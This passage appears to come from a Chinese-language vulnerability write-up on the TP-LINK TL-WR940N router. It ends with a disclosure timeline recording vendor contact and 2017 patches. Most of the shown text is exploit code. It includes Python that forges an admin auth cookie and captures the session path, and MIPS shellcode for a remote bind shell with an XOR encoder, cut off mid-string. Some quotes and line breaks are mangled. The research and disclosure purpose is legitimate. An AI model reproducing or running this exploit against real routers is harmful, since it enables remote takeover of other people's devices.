    #### Generate the auth cookie of the form b64enc(‘admin:’ + md5(‘admin’))
    hash = hashlib.md5()
    hash.update(pwd)
    auth_string = “%s:%s” %(user, hash.hexdigest())
    encoded_string = base64.b64encode(auth_string)print “[+] Encoded authorisation: %s” %encoded_string#### Send the request
    url = “http://” + ip + “/userRpm/LoginRpm.htm?Save=Save”
    print “[+] sending login to ” + url
    req = urllib2.Request(url)
    req.add_header(‘Cookie’, ‘Authorization=Basic %s’ %encoded_string)
    resp = urllib2.urlopen(req)
    #### The server generates a random path for further requests, grab that here
    data = resp.read()
    next_url = “http://%s/%s/userRpm/” %(ip, data.split(“/”)[3])
    print “[+] Got random path for next stage, url is now %s” %next_url
    return (next_url, encoded_string)
    #custom bind shell shellcode with very simple xor encoder
    #followed by a sleep syscall to flush cash before running
    #bad chars = 0x20, 0x00
    shellcode = (
    #encoder
    “\x22\x51\x44\x44\x3c\x11\x99\x99\x36\x31\x99\x99”
    “\x27\xb2\x05\x4b” #0x27b2059f for first_exploit
    “\x22\x52\xfc\xa0\x8e\x4a\xfe\xf9”
    “\x02\x2a\x18\x26\xae\x43\xfe\xf9\x8e\x4a\xff\x41”
    “\x02\x2a\x18\x26\xae\x43\xff\x41\x8e\x4a\xff\x5d”
    “\x02\x2a\x18\x26\xae\x43\xff\x5d\x8e\x4a\xff\x71”
    “\x02\x2a\x18\x26\xae\x43\xff\x71\x8e\x4a\xff\x8d”
    “\x02\x2a\x18\x26\xae\x43\xff\x8d\x8e\x4a\xff\x99”
    “\x02\x2a\x18\x26\xae\x43\xff\x99\x8e\x4a\xff\xa5”
    “\x02\x2a\x18\x26\xae\x43\xff\xa5\x8e\x4a\xff\xad”
    “\x02\x2a\x18\x26\xae\x43\xff\xad\x8e\x4a\xff\xb9”
    “\x02\x2a\x18\x26\xae\x43\xff\xb9\x8e\x4a\xff\xc1”
    “\x02\x2a\x18\x26\xae\x43\xff\xc1”
    #sleep
    “\x24\x12\xff\xff\x24\x02\x10\x46\x24\x0f\x03\x08”
    “\x21\xef\xfc\xfc\xaf\xaf\xfb\xfe\xaf\xaf\xfb\xfa”
    “\x27\xa4\xfb\xfa\x01\x01\x01\x0c\x21\x8c\x11\x5c”
    ################ encoded shellcode ###############
    “\x27\xbd\xff\xe0\x24\x0e\xff\xfd\x98\x59\xb9\xbe\x01\xc0\x28\x27\x28\x06”
    “\xff\xff\x24\x02\x10\x57\x01\x01\x01\x0c\x23\x39\x44\x44\x30\x50\xff\xff”
    “\x24\x0e\xff\xef\x01\xc0\x70\x27\x24\x0d”
    “\x7a\x69”            #
  * 
  * 
  * 
  * 
###### 时间线
  * 向厂商披露漏洞细节 - 11/8/2017
  * 接到厂商回应与初步咨询请求 - 14/8/2017
  * 发送初步咨询建议 - 14/8/2017
  * 测试版补丁发送厂商测试 - 17/8/2017
  * 确认补丁有效，其他漏洞由作者自行查找；第二个攻击链构造是为了证明这一点。发送厂商 - 17/8/2017
  * 厂商回应将研究其他漏洞区域 - 18/8/2017
  * 发送供厂商测试的第二个补丁 - 25/8/17
  * 确认补丁以缓解漏洞（移除了500多个strcpy调用）- 29/8/2017
  * [补丁发布](https://www.tp-link.com/us/download/TL-WR940N_V5.html#Firmware "补丁发布") \- 28/9/2017（仅限HW V5 US）
* * *